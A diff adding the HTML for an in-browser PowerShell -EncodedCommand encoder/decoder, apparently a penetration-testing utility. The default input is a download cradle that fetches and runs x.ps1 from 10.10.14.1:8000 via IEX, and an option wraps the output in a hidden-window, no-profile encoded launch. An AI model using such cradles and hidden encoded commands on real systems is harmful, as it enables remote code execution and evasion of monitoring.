@@ -1,0 +1,8 @@
+<div class="tk-row">
+  <div class="tk-seg" id="dir"><label><input type="radio" name="dir" value="enc" checked><span>Encode</span></label><label><input type="radio" name="dir" value="dec"><span>Decode</span></label></div>
+  <label class="tk-check" id="wrapl"><input type="checkbox" id="wrap" checked> wrap in <code>powershell -nop -w hidden -enc …</code></label>
+</div>
+<div class="tk-field"><div class="tk-label"><span id="inl">PowerShell command</span></div><textarea id="in" spellcheck="false" rows="4">IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/x.ps1')</textarea></div>
+<div class="tk-field"><div class="tk-label"><span id="outl">-EncodedCommand</span><span class="r"><button type="button" class="tk-copy" data-copy="#out">copy</button></span></div><textarea id="out" readonly spellcheck="false" rows="4"></textarea></div>
+<div class="tk-msg" id="msg"></div>
+<p class="dim">The blob is UTF-16LE then Base64 — what <code>-EncodedCommand</code> expects. Everything stays in your browser.</p>
